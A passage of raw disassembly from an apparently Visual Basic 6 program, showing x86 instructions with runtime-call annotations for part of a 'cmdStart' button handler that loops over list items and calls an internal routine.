008D5EC0: mov var_000000D4, 008F2010h
008D5ECA: push 00000000h
008D5ECC: push 00000004h
008D5ECE: push 00440E58h
008D5ED3: push 00000010h
008D5ED5: pop eax
008D5ED6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5EDB: lea esi, var_7C
008D5EDE: mov edi, esp
008D5EE0: movsd 
008D5EE1: movsd 
008D5EE2: movsd 
008D5EE3: movsd 
008D5EE4: push 00000001h
008D5EE6: push 00000000h
008D5EE8: push 00440E48h
008D5EED: push 00000000h
008D5EEF: push 00000018h
008D5EF1: mov eax, var_000000D4
008D5EF7: mov eax, [eax]
008D5EF9: mov ecx, var_000000D4
008D5EFF: mov ecx, [ecx]
008D5F01: mov ecx, [ecx]
008D5F03: push eax
008D5F04: call [ecx+0000054Ch]
008D5F0A: push eax
008D5F0B: lea eax, var_30
008D5F0E: push eax
008D5F0F: call 00410A84h ; Set (object)
008D5F14: push eax
008D5F15: lea eax, var_48
008D5F18: push eax
008D5F19: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5F1E: add esp, 00000010h
008D5F21: push eax
008D5F22: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5F27: push eax
008D5F28: lea eax, var_34
008D5F2B: push eax
008D5F2C: call 00410A84h ; Set (object)
008D5F31: push eax
008D5F32: lea eax, var_58
008D5F35: push eax
008D5F36: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5F3B: add esp, 00000020h
008D5F3E: push eax
008D5F3F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5F44: push eax
008D5F45: lea eax, var_38
008D5F48: push eax
008D5F49: call 00410A84h ; Set (object)
008D5F4E: push eax
008D5F4F: lea eax, var_68
008D5F52: push eax
008D5F53: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5F58: add esp, 00000010h
008D5F5B: push eax
008D5F5C: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D5F61: sub ax, FFFFh
008D5F65: neg ax
008D5F68: sbb eax, eax
008D5F6A: inc eax
008D5F6B: neg eax
008D5F6D: mov var_000000A8, ax
008D5F74: lea eax, var_38
008D5F77: push eax
008D5F78: lea eax, var_34
008D5F7B: push eax
008D5F7C: lea eax, var_30
008D5F7F: push eax
008D5F80: push 00000003h
008D5F82: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5F87: add esp, 00000010h
008D5F8A: lea eax, var_68
008D5F8D: push eax
008D5F8E: lea eax, var_58
008D5F91: push eax
008D5F92: lea eax, var_48
008D5F95: push eax
008D5F96: push 00000003h
008D5F98: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5F9D: add esp, 00000010h
008D5FA0: movsx eax, word ptr var_000000A8
008D5FA7: test eax, eax
008D5FA9: jz 008D6155h
008D5FAF: mov var_04, 00000006h
008D5FB6: mov eax, var_24
008D5FB9: mov var_74, eax
008D5FBC: mov var_7C, 00000003h
008D5FC3: cmp [008F2010h], 00000000h
008D5FCA: jnz 8D5FE7h
008D5FCC: push 008F2010h
008D5FD1: push 00433984h
008D5FD6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D5FDB: mov var_000000D8, 008F2010h
008D5FE5: jmp 8D5FF1h
008D5FE7: mov var_000000D8, 008F2010h
008D5FF1: push 00000000h
008D5FF3: push 00000014h
008D5FF5: push 00440E58h
008D5FFA: push 00000010h
008D5FFC: pop eax
008D5FFD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6002: lea esi, var_7C
008D6005: mov edi, esp
008D6007: movsd 
008D6008: movsd 
008D6009: movsd 
008D600A: movsd 
008D600B: push 00000001h
008D600D: push 00000000h
008D600F: push 00440E48h
008D6014: push 00000000h
008D6016: push 00000018h
008D6018: mov eax, var_000000D8
008D601E: mov eax, [eax]
008D6020: mov ecx, var_000000D8
008D6026: mov ecx, [ecx]
008D6028: mov ecx, [ecx]
008D602A: push eax
008D602B: call [ecx+0000054Ch]
008D6031: push eax
008D6032: lea eax, var_30
008D6035: push eax
008D6036: call 00410A84h ; Set (object)
008D603B: push eax
008D603C: lea eax, var_48
008D603F: push eax
008D6040: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6045: add esp, 00000010h
008D6048: push eax
008D6049: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D604E: push eax
008D604F: lea eax, var_34
008D6052: push eax
008D6053: call 00410A84h ; Set (object)
008D6058: push eax
008D6059: lea eax, var_58
008D605C: push eax
008D605D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6062: add esp, 00000020h
008D6065: push eax
008D6066: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D606B: push eax
008D606C: lea eax, var_38
008D606F: push eax
008D6070: call 00410A84h ; Set (object)
008D6075: push eax
008D6076: lea eax, var_68
008D6079: push eax
008D607A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D607F: add esp, 00000010h
008D6082: push eax
008D6083: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D6088: mov edx, eax
008D608A: lea ecx, var_28
008D608D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D6092: push eax
008D6093: call 004109DCh ; Val(arg_1)
008D6098: fstp real8 ptr var_000000A4
008D609E: push 00000000h
008D60A0: push 00000000h
008D60A2: push 00000001h
008D60A4: push 00000000h
008D60A6: lea eax, var_6C
008D60A9: push eax
008D60AA: push 00000010h
008D60AC: push 00000880h
008D60B1: call 00410946h ; ReDim
008D60B6: add esp, 0000001Ch
008D60B9: mov var_00000094, 00442930h
008D60C3: mov var_0000009C, 00000008h
008D60CD: lea esi, var_0000009C
008D60D3: push 00000000h
008D60D5: push var_6C
008D60D8: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008D60DD: mov ecx, eax
008D60DF: mov edx, esi
008D60E1: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008D60E6: mov edx, 0043DA70h ; x126
008D60EB: lea ecx, var_2C
008D60EE: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008D60F3: lea eax, var_6C
008D60F6: push eax
008D60F7: lea eax, var_2C
008D60FA: push eax
008D60FB: fld real8 ptr var_000000A4
008D6101: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008D6106: push eax
008D6107: call 007A6910h
008D610C: lea eax, var_6C
008D610F: push eax
008D6110: push 00000000h
008D6112: call 00410934h ; Erase
008D6117: lea eax, var_2C
008D611A: push eax
008D611B: lea eax, var_28
008D611E: push eax
008D611F: push 00000002h
008D6121: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D6126: add esp, 0000000Ch
008D6129: lea eax, var_38
008D612C: push eax
008D612D: lea eax, var_34
008D6130: push eax
008D6131: lea eax, var_30
008D6134: push eax
008D6135: push 00000003h
008D6137: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D613C: add esp, 00000010h
008D613F: lea eax, var_68
008D6142: push eax
008D6143: lea eax, var_58
008D6146: push eax
008D6147: lea eax, var_48
008D614A: push eax
008D614B: push 00000003h
008D614D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D6152: add esp, 00000010h
008D6155: mov var_04, 00000008h
008D615C: jmp 008D5E67h
008D6161: jmp 008D6532h
008D6166: mov var_04, 0000000Ah
008D616D: cmp [008F2010h], 00000000h
008D6174: jnz 8D6191h
008D6176: push 008F2010h
008D617B: push 00433984h
008D6180: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D6185: mov var_000000DC, 008F2010h
008D618F: jmp 8D619Bh
008D6191: mov var_000000DC, 008F2010h
008D619B: push 00000000h
008D619D: push 00000001h
008D619F: push 00440E48h
008D61A4: push 00000000h
008D61A6: push 00000018h
008D61A8: mov eax, var_000000DC
008D61AE: mov eax, [eax]
008D61B0: mov ecx, var_000000DC
008D61B6: mov ecx, [ecx]
008D61B8: mov ecx, [ecx]
008D61BA: push eax
008D61BB: call [ecx+00000550h]
008D61C1: push eax
008D61C2: lea eax, var_30
008D61C5: push eax
008D61C6: call 00410A84h ; Set (object)
008D61CB: push eax
008D61CC: lea eax, var_48
008D61CF: push eax
008D61D0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D61D5: add esp, 00000010h
008D61D8: push eax
008D61D9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D61DE: push eax
008D61DF: lea eax, var_34
008D61E2: push eax
008D61E3: call 00410A84h ; Set (object)
008D61E8: push eax
008D61E9: lea eax, var_58
008D61EC: push eax
008D61ED: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D61F2: add esp, 00000010h
008D61F5: push eax
008D61F6: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D61FB: mov var_000000B8, eax
008D6201: mov var_000000B4, 00000001h
008D620B: mov var_24, 00000001h
008D6212: lea eax, var_34
008D6215: push eax
008D6216: lea eax, var_30
008D6219: push eax
008D621A: push 00000002h
008D621C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6221: add esp, 0000000Ch
008D6224: lea eax, var_58
008D6227: push eax
008D6228: lea eax, var_48
008D622B: push eax
008D622C: push 00000002h
008D622E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D6233: add esp, 0000000Ch
008D6236: jmp 8D624Ah
008D6238: mov eax, var_24
008D623B: add eax, var_000000B4
008D6241: jo 008D65ABh
008D6247: mov var_24, eax
008D624A: mov eax, var_24
008D624D: cmp eax, var_000000B8
008D6253: jnle 008D6532h
008D6259: mov var_04, 0000000Bh
008D6260: mov eax, var_24
008D6263: mov var_74, eax
008D6266: mov var_7C, 00000003h
008D626D: cmp [008F2010h], 00000000h
008D6274: jnz 8D6291h
008D6276: push 008F2010h
008D627B: push 00433984h
008D6280: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D6285: mov var_000000E0, 008F2010h
008D628F: jmp 8D629Bh
008D6291: mov var_000000E0, 008F2010h
008D629B: push 00000000h
008D629D: push 00000004h
008D629F: push 00440E58h
008D62A4: push 00000010h
008D62A6: pop eax
008D62A7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D62AC: lea esi, var_7C
008D62AF: mov edi, esp
008D62B1: movsd 
008D62B2: movsd 
008D62B3: movsd 
008D62B4: movsd 
008D62B5: push 00000001h
008D62B7: push 00000000h
008D62B9: push 00440E48h
008D62BE: push 00000000h
008D62C0: push 00000018h
008D62C2: mov eax, var_000000E0
008D62C8: mov eax, [eax]
008D62CA: mov ecx, var_000000E0
008D62D0: mov ecx, [ecx]
008D62D2: mov ecx, [ecx]
008D62D4: push eax
008D62D5: call [ecx+00000550h]
008D62DB: push eax
008D62DC: lea eax, var_30
008D62DF: push eax
008D62E0: call 00410A84h ; Set (object)
008D62E5: push eax
008D62E6: lea eax, var_48
008D62E9: push eax
008D62EA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D62EF: add esp, 00000010h
008D62F2: push eax
008D62F3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D62F8: push eax
008D62F9: lea eax, var_34
008D62FC: push eax
008D62FD: call 00410A84h ; Set (object)
008D6302: push eax
008D6303: lea eax, var_58
008D6306: push eax
008D6307: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D630C: add esp, 00000020h
008D630F: push eax
008D6310: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D6315: push eax
008D6316: lea eax, var_38
008D6319: push eax
008D631A: call 00410A84h ; Set (object)
008D631F: push eax
008D6320: lea eax, var_68
008D6323: push eax
008D6324: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6329: add esp, 00000010h
008D632C: push eax
008D632D: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D6332: sub ax, FFFFh
008D6336: neg ax
008D6339: sbb eax, eax
008D633B: inc eax
008D633C: neg eax
008D633E: mov var_000000A8, ax
008D6345: lea eax, var_38
008D6348: push eax
008D6349: lea eax, var_34
008D634C: push eax
008D634D: lea eax, var_30
008D6350: push eax
008D6351: push 00000003h
008D6353: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6358: add esp, 00000010h
008D635B: lea eax, var_68
008D635E: push eax
008D635F: lea eax, var_58
008D6362: push eax
008D6363: lea eax, var_48
008D6366: push eax
008D6367: push 00000003h
008D6369: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D636E: add esp, 00000010h
008D6371: movsx eax, word ptr var_000000A8
008D6378: test eax, eax
008D637A: jz 008D6526h
008D6380: mov var_04, 0000000Ch
008D6387: mov eax, var_24
008D638A: mov var_74, eax
008D638D: mov var_7C, 00000003h
008D6394: cmp [008F2010h], 00000000h
008D639B: jnz 8D63B8h
008D639D: push 008F2010h
008D63A2: push 00433984h
008D63A7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D63AC: mov var_000000E4, 008F2010h
008D63B6: jmp 8D63C2h
008D63B8: mov var_000000E4, 008F2010h
008D63C2: push 00000000h
008D63C4: push 00000014h
008D63C6: push 00440E58h
008D63CB: push 00000010h
008D63CD: pop eax
008D63CE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D63D3: lea esi, var_7C
008D63D6: mov edi, esp
008D63D8: movsd 
008D63D9: movsd 
008D63DA: movsd 
008D63DB: movsd 
008D63DC: push 00000001h
008D63DE: push 00000000h
008D63E0: push 00440E48h
008D63E5: push 00000000h
008D63E7: push 00000018h
008D63E9: mov eax, var_000000E4
008D63EF: mov eax, [eax]
008D63F1: mov ecx, var_000000E4
008D63F7: mov ecx, [ecx]
008D63F9: mov ecx, [ecx]
008D63FB: push eax
008D63FC: call [ecx+00000550h]
008D6402: push eax
008D6403: lea eax, var_30
008D6406: push eax
008D6407: call 00410A84h ; Set (object)
008D640C: push eax
008D640D: lea eax, var_48
008D6410: push eax
008D6411: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6416: add esp, 00000010h
008D6419: push eax
008D641A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D641F: push eax
008D6420: lea eax, var_34
008D6423: push eax
008D6424: call 00410A84h ; Set (object)
008D6429: push eax
008D642A: lea eax, var_58
008D642D: push eax
008D642E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6433: add esp, 00000020h
008D6436: push eax
008D6437: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D643C: push eax
008D643D: lea eax, var_38
008D6440: push eax
008D6441: call 00410A84h ; Set (object)
008D6446: push eax
008D6447: lea eax, var_68
008D644A: push eax
008D644B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6450: add esp, 00000010h
008D6453: push eax
008D6454: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D6459: mov edx, eax
008D645B: lea ecx, var_28
008D645E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D6463: push eax
008D6464: call 004109DCh ; Val(arg_1)
008D6469: fstp real8 ptr var_000000A4
008D646F: push 00000000h
008D6471: push 00000000h
008D6473: push 00000001h
008D6475: push 00000000h
008D6477: lea eax, var_6C
008D647A: push eax
008D647B: push 00000010h
008D647D: push 00000880h
008D6482: call 00410946h ; ReDim
008D6487: add esp, 0000001Ch
008D648A: mov var_00000094, 00442930h
008D6494: mov var_0000009C, 00000008h
008D649E: lea esi, var_0000009C
008D64A4: push 00000000h
008D64A6: push var_6C
008D64A9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008D64AE: mov ecx, eax
008D64B0: mov edx, esi
008D64B2: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008D64B7: mov edx, 0043DA70h ; x126
008D64BC: lea ecx, var_2C
008D64BF: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008D64C4: lea eax, var_6C
008D64C7: push eax
008D64C8: lea eax, var_2C
008D64CB: push eax
008D64CC: fld real8 ptr var_000000A4
008D64D2: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008D64D7: push eax
008D64D8: call 007A6910h
008D64DD: lea eax, var_6C
008D64E0: push eax
008D64E1: push 00000000h
008D64E3: call 00410934h ; Erase
008D64E8: lea eax, var_2C
008D64EB: push eax
008D64EC: lea eax, var_28
008D64EF: push eax
008D64F0: push 00000002h
008D64F2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D64F7: add esp, 0000000Ch
008D64FA: lea eax, var_38
008D64FD: push eax
008D64FE: lea eax, var_34
008D6501: push eax
008D6502: lea eax, var_30
008D6505: push eax
008D6506: push 00000003h
008D6508: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D650D: add esp, 00000010h
008D6510: lea eax, var_68
008D6513: push eax
008D6514: lea eax, var_58
008D6517: push eax
008D6518: lea eax, var_48
008D651B: push eax
008D651C: push 00000003h
008D651E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D6523: add esp, 00000010h
008D6526: mov var_04, 0000000Eh
008D652D: jmp 008D6238h
008D6532: mov var_10, 00000000h
008D6539: wait 
008D653A: push 008D658Ch
008D653F: jmp 8D658Bh
008D6541: lea eax, var_2C
008D6544: push eax
008D6545: lea eax, var_28
008D6548: push eax
008D6549: push 00000002h
008D654B: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D6550: add esp, 0000000Ch
008D6553: lea eax, var_38
008D6556: push eax
008D6557: lea eax, var_34
008D655A: push eax
008D655B: lea eax, var_30
008D655E: push eax
008D655F: push 00000003h
008D6561: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6566: add esp, 00000010h
008D6569: lea eax, var_68
008D656C: push eax
008D656D: lea eax, var_58
008D6570: push eax
008D6571: lea eax, var_48
008D6574: push eax
008D6575: push 00000003h
008D6577: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D657C: add esp, 00000010h
008D657F: lea eax, var_6C
008D6582: push eax
008D6583: push 00000000h
008D6585: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008D658A: ret 
End Sub

Private sub cmdStart__8D5414
008D5414: push ebp
008D5415: mov ebp, esp
008D5417: sub esp, 00000018h
008D541A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D541F: mov eax, fs:[00h]
008D5425: push eax
008D5426: mov fs:[00000000h], esp
008D542D: mov eax, 000000C4h
008D5432: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5437: push ebx
008D5438: push esi
008D5439: push edi
008D543A: mov var_18, esp
008D543D: mov var_14, 0040FC28h
008D5444: mov eax, [ebp+08h]
008D5447: and eax, 00000001h
008D544A: mov var_10, eax
008D544D: mov eax, [ebp+08h]
008D5450: and al, FEh
008D5452: mov [ebp+08h], eax
008D5455: mov var_0C, 00000000h
008D545C: mov eax, [ebp+08h]
008D545F: mov eax, [eax]
008D5461: push [ebp+08h]
008D5464: call [eax+04h]
008D5467: mov var_04, 00000001h
008D546E: mov var_04, 00000002h
008D5475: push FFFFFFFFh
008D5477: call 00410A60h ; On Error ...
008D547C: mov var_04, 00000003h
008D5483: push 00000000h
008D5485: push 00000003h
008D5487: push 00440E48h
008D548C: push 00000000h
008D548E: push 00000018h
008D5490: mov eax, [ebp+08h]
008D5493: mov eax, [eax]
008D5495: push [ebp+08h]
008D5498: call [eax+00000308h]
008D549E: push eax
008D549F: lea eax, var_30
008D54A2: push eax
008D54A3: call 00410A84h ; Set (object)
008D54A8: push eax
008D54A9: lea eax, var_48
008D54AC: push eax
008D54AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D54B2: add esp, 00000010h
008D54B5: push eax
008D54B6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D54BB: push eax
008D54BC: lea eax, var_34
008D54BF: push eax
008D54C0: call 00410A84h ; Set (object)
008D54C5: push eax
008D54C6: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D54CB: add esp, 0000000Ch
008D54CE: lea eax, var_34
008D54D1: push eax
008D54D2: lea eax, var_30
008D54D5: push eax
008D54D6: push 00000002h
008D54D8: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D54DD: add esp, 0000000Ch
008D54E0: lea ecx, var_48
008D54E3: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D54E8: mov var_04, 00000004h
008D54EF: cmp word ptr [008F2430h], FFFFh
008D54F7: jnz 008D58CEh
008D54FD: mov var_04, 00000005h
008D5504: cmp [008F2010h], 00000000h
008D550B: jnz 8D5528h
008D550D: push 008F2010h
008D5512: push 00433984h
008D5517: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D551C: mov var_000000D0, 008F2010h
008D5526: jmp 8D5532h
008D5528: mov var_000000D0, 008F2010h
008D5532: push 00000000h
008D5534: push 00000001h
008D5536: push 00440E48h
008D553B: push 00000000h
008D553D: push 00000018h
008D553F: mov eax, var_000000D0
008D5545: mov eax, [eax]
008D5547: mov ecx, var_000000D0
008D554D: mov ecx, [ecx]
008D554F: mov ecx, [ecx]
008D5551: push eax
008D5552: call [ecx+0000054Ch]
008D5558: push eax
008D5559: lea eax, var_30
008D555C: push eax
008D555D: call 00410A84h ; Set (object)
008D5562: push eax
008D5563: lea eax, var_48
008D5566: push eax
008D5567: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D556C: add esp, 00000010h
008D556F: push eax
008D5570: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5575: push eax
008D5576: lea eax, var_34
008D5579: push eax
008D557A: call 00410A84h ; Set (object)
008D557F: push eax
008D5580: lea eax, var_58
008D5583: push eax
008D5584: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5589: add esp, 00000010h
008D558C: push eax
008D558D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D5592: mov var_000000B0, eax
008D5598: mov var_000000AC, 00000001h
008D55A2: mov var_24, 00000001h
008D55A9: lea eax, var_34
008D55AC: push eax
008D55AD: lea eax, var_30
008D55B0: push eax
008D55B1: push 00000002h
008D55B3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D55B8: add esp, 0000000Ch
008D55BB: lea eax, var_58
008D55BE: push eax
008D55BF: lea eax, var_48
008D55C2: push eax
008D55C3: push 00000002h
008D55C5: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D55CA: add esp, 0000000Ch
008D55CD: jmp 8D55E1h
008D55CF: mov eax, var_24
008D55D2: add eax, var_000000AC
008D55D8: jo 008D5D13h
008D55DE: mov var_24, eax
008D55E1: mov eax, var_24
008D55E4: cmp eax, var_000000B0
008D55EA: jnle 008D58C9h
008D55F0: mov var_04, 00000006h
008D55F7: mov eax, var_24
008D55FA: mov var_74, eax
008D55FD: mov var_7C, 00000003h
008D5604: cmp [008F2010h], 00000000h
008D560B: jnz 8D5628h
008D560D: push 008F2010h
008D5612: push 00433984h
008D5617: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D561C: mov var_000000D4, 008F2010h
008D5626: jmp 8D5632h
008D5628: mov var_000000D4, 008F2010h
008D5632: push 00000000h
008D5634: push 00000004h
008D5636: push 00440E58h
008D563B: push 00000010h
008D563D: pop eax
008D563E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5643: lea esi, var_7C
008D5646: mov edi, esp
008D5648: movsd 
008D5649: movsd 
008D564A: movsd 
008D564B: movsd 
008D564C: push 00000001h
008D564E: push 00000000h
008D5650: push 00440E48h
008D5655: push 00000000h
008D5657: push 00000018h
008D5659: mov eax, var_000000D4
008D565F: mov eax, [eax]
008D5661: mov ecx, var_000000D4
008D5667: mov ecx, [ecx]
008D5669: mov ecx, [ecx]
008D566B: push eax
008D566C: call [ecx+0000054Ch]
008D5672: push eax
008D5673: lea eax, var_30
008D5676: push eax
008D5677: call 00410A84h ; Set (object)
008D567C: push eax
008D567D: lea eax, var_48
008D5680: push eax
008D5681: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5686: add esp, 00000010h
008D5689: push eax
008D568A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D568F: push eax
008D5690: lea eax, var_34
008D5693: push eax
008D5694: call 00410A84h ; Set (object)
008D5699: push eax
008D569A: lea eax, var_58
008D569D: push eax
008D569E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D56A3: add esp, 00000020h
008D56A6: push eax
008D56A7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D56AC: push eax
008D56AD: lea eax, var_38
008D56B0: push eax
008D56B1: call 00410A84h ; Set (object)
008D56B6: push eax
008D56B7: lea eax, var_68
008D56BA: push eax
008D56BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D56C0: add esp, 00000010h
008D56C3: push eax
008D56C4: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D56C9: sub ax, FFFFh
008D56CD: neg ax
008D56D0: sbb eax, eax
008D56D2: inc eax
008D56D3: neg eax
008D56D5: mov var_000000A8, ax
008D56DC: lea eax, var_38
008D56DF: push eax
008D56E0: lea eax, var_34
008D56E3: push eax
008D56E4: lea eax, var_30
008D56E7: push eax
008D56E8: push 00000003h
008D56EA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D56EF: add esp, 00000010h
008D56F2: lea eax, var_68
008D56F5: push eax
008D56F6: lea eax, var_58
008D56F9: push eax
008D56FA: lea eax, var_48
008D56FD: push eax
008D56FE: push 00000003h
008D5700: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5705: add esp, 00000010h
008D5708: movsx eax, word ptr var_000000A8
008D570F: test eax, eax
008D5711: jz 008D58BDh
008D5717: mov var_04, 00000007h
008D571E: mov eax, var_24
008D5721: mov var_74, eax
008D5724: mov var_7C, 00000003h
008D572B: cmp [008F2010h], 00000000h
008D5732: jnz 8D574Fh
008D5734: push 008F2010h
008D5739: push 00433984h
008D573E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D5743: mov var_000000D8, 008F2010h
008D574D: jmp 8D5759h
008D574F: mov var_000000D8, 008F2010h
008D5759: push 00000000h
008D575B: push 00000014h
008D575D: push 00440E58h
008D5762: push 00000010h
008D5764: pop eax
008D5765: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D576A: lea esi, var_7C
008D576D: mov edi, esp
008D576F: movsd 
008D5770: movsd 
008D5771: movsd 
008D5772: movsd 
008D5773: push 00000001h
008D5775: push 00000000h
008D5777: push 00440E48h
008D577C: push 00000000h
008D577E: push 00000018h
008D5780: mov eax, var_000000D8
008D5786: mov eax, [eax]
008D5788: mov ecx, var_000000D8
008D578E: mov ecx, [ecx]
008D5790: mov ecx, [ecx]
008D5792: push eax
008D5793: call [ecx+0000054Ch]
008D5799: push eax
008D579A: lea eax, var_30
008D579D: push eax
008D579E: call 00410A84h ; Set (object)
008D57A3: push eax
008D57A4: lea eax, var_48
008D57A7: push eax
008D57A8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D57AD: add esp, 00000010h
008D57B0: push eax
008D57B1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D57B6: push eax
008D57B7: lea eax, var_34
008D57BA: push eax
008D57BB: call 00410A84h ; Set (object)
008D57C0: push eax
008D57C1: lea eax, var_58
008D57C4: push eax
008D57C5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D57CA: add esp, 00000020h
008D57CD: push eax
008D57CE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D57D3: push eax
008D57D4: lea eax, var_38
008D57D7: push eax
008D57D8: call 00410A84h ; Set (object)
008D57DD: push eax
008D57DE: lea eax, var_68
008D57E1: push eax
008D57E2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D57E7: add esp, 00000010h
008D57EA: push eax
008D57EB: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D57F0: mov edx, eax
008D57F2: lea ecx, var_28
008D57F5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D57FA: push eax
008D57FB: call 004109DCh ; Val(arg_1)
008D5800: fstp real8 ptr var_000000A4
008D5806: push 00000000h
008D5808: push 00000000h
008D580A: push 00000001h
008D580C: push 00000000h
008D580E: lea eax, var_6C
008D5811: push eax
008D5812: push 00000010h
008D5814: push 00000880h
008D5819: call 00410946h ; ReDim
008D581E: add esp, 0000001Ch
008D5821: mov var_00000094, 00442938h
008D582B: mov var_0000009C, 00000008h
008D5835: lea esi, var_0000009C
008D583B: push 00000000h
008D583D: push var_6C
008D5840: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008D5845: mov ecx, eax
008D5847: mov edx, esi
008D5849: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008D584E: mov edx, 0043DA70h ; x126
008D5853: lea ecx, var_2C
008D5856: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008D585B: lea eax, var_6C
008D585E: push eax
008D585F: lea eax, var_2C
008D5862: push eax
008D5863: fld real8 ptr var_000000A4
008D5869: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008D586E: push eax
008D586F: call 007A6910h
008D5874: lea eax, var_6C
008D5877: push eax
008D5878: push 00000000h
008D587A: call 00410934h ; Erase
008D587F: lea eax, var_2C
008D5882: push eax
008D5883: lea eax, var_28
008D5886: push eax
008D5887: push 00000002h
008D5889: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D588E: add esp, 0000000Ch
008D5891: lea eax, var_38
008D5894: push eax
008D5895: lea eax, var_34
008D5898: push eax
008D5899: lea eax, var_30
008D589C: push eax
008D589D: push 00000003h
008D589F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D58A4: add esp, 00000010h
008D58A7: lea eax, var_68
008D58AA: push eax
008D58AB: lea eax, var_58
008D58AE: push eax
